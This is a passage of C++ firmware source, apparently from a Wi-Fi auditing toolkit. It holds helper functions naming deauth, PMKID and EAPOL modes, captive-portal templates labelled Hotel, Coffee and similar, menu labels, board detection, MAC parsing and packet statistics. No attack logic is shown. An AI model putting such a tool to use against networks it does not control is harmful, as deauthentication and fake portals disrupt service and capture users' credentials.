      case MONITOR_BEACON: return "beacon";
      case MONITOR_PROBE: return "probe";
      case MONITOR_DEAUTH: return "deauth";
      case MONITOR_EAPOL: return "eapol";
      case MONITOR_OFF:
      default: return "off";
    }
  }

  static const char *activeName(ActiveMode mode) {
    switch (mode) {
      case ACTIVE_BEACON: return "beacon";
      case ACTIVE_PROBE: return "probe";
      case ACTIVE_DEAUTH: return "deauth";
      case ACTIVE_PMKID: return "pmkid";
      case ACTIVE_OFF:
      default: return "off";
    }
  }

  const char *portalTemplateName(int idx) const {
    static const char *names[PORTAL_COUNT] = {"Hotel", "Coffee", "Conference", "Device", "University"};
    if (idx < 0 || idx >= PORTAL_COUNT) {
      return "Unknown";
    }
    return names[idx];
  }

  const char *menuItemName(int idx) const {
    static const char *names[MENU_COUNT] = {
      "Scan APs", "List APs", "Monitor", "Beacon Lab",
      "Deauth Lab", "PCAP", "Portal", "BLE"
    };
    return names[idx % MENU_COUNT];
  }

  const char *menuItemHint(int idx) const {
    static const char *hints[MENU_COUNT] = {
      "Find targets", "Show targets", "Packets/stations", "Lab TX beacons",
      "Selected APs", "SD capture", "Lab portal", "BLE scanner"
    };
    return hints[idx % MENU_COUNT];
  }

  static BoardCapabilities detectCapabilities(const char *boardName) {
    BoardCapabilities caps;
    String name(boardName);
    caps.activeWifi = true;
    if (name.indexOf("starbeam") >= 0) {
      caps.display = true;
      caps.ble = true;
      caps.portal = true;
      caps.boardRadios = true;
    } else if (name.indexOf("waveshare") >= 0) {
      caps.display = true;
      caps.touch = true;
      caps.storage = true;
      caps.portal = true;
      caps.ble = true;
      caps.boardTools = true;
    } else if (name.indexOf("cypherbox") >= 0) {
      caps.display = true;
      caps.storage = true;
      caps.portal = true;
      caps.ble = true;
      caps.boardTools = true;
    } else if (name.indexOf("devboard-custom") >= 0) {
      caps.display = true;
    }
    return caps;
  }

  static String macToString(const uint8_t *mac) {
    char out[18];
    snprintf(out, sizeof(out), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(out);
  }

  static bool parseMac(const String &value, uint8_t *out) {
    int vals[6];
    if (sscanf(value.c_str(), "%x:%x:%x:%x:%x:%x", &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]) != 6) {
      return false;
    }
    for (int i = 0; i < 6; i++) out[i] = static_cast<uint8_t>(vals[i]);
    return true;
  }

  static bool isBroadcast(const uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
      if (mac[i] != 0xFF) return false;
    }
    return true;
  }

  static bool isZeroMac(const uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
      if (mac[i] != 0x00) return false;
    }
    return true;
  }

  void printStatsLine() const {
    const int32_t avgRssi = _stats.total ? (_stats.rssiTotal / static_cast<int32_t>(_stats.total)) : 0;
    Serial.printf("[marauder] ch=%u total=%lu mgmt=%lu data=%lu ctrl=%lu beacon=%lu probe=%lu deauth=%lu disassoc=%lu eapol=%lu rssi=%d avg=%ld\n",
                  _channel,
                  static_cast<unsigned long>(_stats.total),
                  static_cast<unsigned long>(_stats.management),
                  static_cast<unsigned long>(_stats.data),
                  static_cast<unsigned long>(_stats.control),
                  static_cast<unsigned long>(_stats.beacon),
                  static_cast<unsigned long>(_stats.probe),
                  static_cast<unsigned long>(_stats.deauth),
                  static_cast<unsigned long>(_stats.disassoc),
                  static_cast<unsigned long>(_stats.eapol),
                  _stats.lastRssi,
                  static_cast<long>(avgRssi));
  }
};

inline Core &core() {
  static Core instance;
  return instance;
}

}  // namespace MarauderCore
